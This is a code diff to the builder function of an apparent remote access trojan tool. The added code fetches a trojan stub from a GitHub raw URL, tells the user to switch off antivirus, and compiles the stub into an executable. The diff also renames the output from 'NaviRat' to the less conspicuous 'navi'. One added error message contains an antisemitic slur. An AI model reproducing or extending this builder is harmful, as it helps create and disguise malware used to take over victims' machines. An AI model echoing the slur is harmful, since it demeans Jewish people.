@@ -15,8 +15,18 @@ def rat_builder_init():
     stub_template = "modules/stub/rat_stub.txt"
     if not os.path.exists(stub_template):
         print(Colorate.Horizontal(_cl["num"], f"  [!] Stub template not found: {stub_template}"))
-        time.sleep(2)
-        return
+        print(Colorate.Horizontal(_cl["txt"], f"  [!] Warning: The file will be downloaded from GitHub. Turn off ur antivirus! Otherwise the stub will be deleted."))
+        input(Colorate.Horizontal(_cl["head"], "  Press Enter to start the download..."))
+        try:
+            import urllib.request
+            os.makedirs(os.path.dirname(stub_template), exist_ok=True)
+            url = "https://raw.githubusercontent.com/glockinhand/glockinhand/refs/heads/main/rat_stub.txt"
+            urllib.request.urlretrieve(url, stub_template)
+            print(Colorate.Horizontal(_cl["head"], "  [+] File downloaded successfully."))
+        except Exception as e:
+            print(Colorate.Horizontal(_cl["num"], f"  [-] Download failed: {str(e)}"))
+            time.sleep(2)
+            return
 
     try:
         if not os.path.exists("build"): 
@@ -58,7 +68,7 @@ def rat_builder_init():
             "--distpath", output_dir,
             "--workpath", "build",
             "--specpath", "build",
-            "--name", "NaviRat",
+            "--name", "navi",
             temp_stub
         ]
 
@@ -66,7 +76,7 @@ def rat_builder_init():
 
         if process.returncode == 0:
             print(Colorate.Horizontal(_cl["head"], f"  [+] Build successful! All modules packed."))
-            print(Colorate.Horizontal(_cl["head"], f"  [+] EXE located in: {output_dir}/NaviRat.exe"))
+            print(Colorate.Horizontal(_cl["head"], f"  [+] EXE located in: {output_dir}/navi.exe"))
         else:
             print(Colorate.Horizontal(_cl["num"], "  [-] Build failed!"))
 
@@ -75,7 +85,11 @@ def rat_builder_init():
         input(Colorate.Horizontal(_cl["head"], "\n  Press Enter to return..."))
 
     except Exception as e:
-        print(Colorate.Horizontal(_cl["num"], f"  [-] An error occurred: {str(e)}"))
+        error_msg = str(e)
+        if "the system cannot find the file" in error_msg.lower() or "[WinError 2]" in error_msg.lower() or isinstance(e, FileNotFoundError):
+            print(Colorate.Horizontal(_cl["num"], "  [-] You didnt turn off ur antivirus, stub was deleted by some jew software. Good job dumbass..."))
+        else:
+            print(Colorate.Horizontal(_cl["num"], f"  [-] An error occurred: {error_msg}"))
         time.sleep(3)
 
 if __name__ == "__main__":
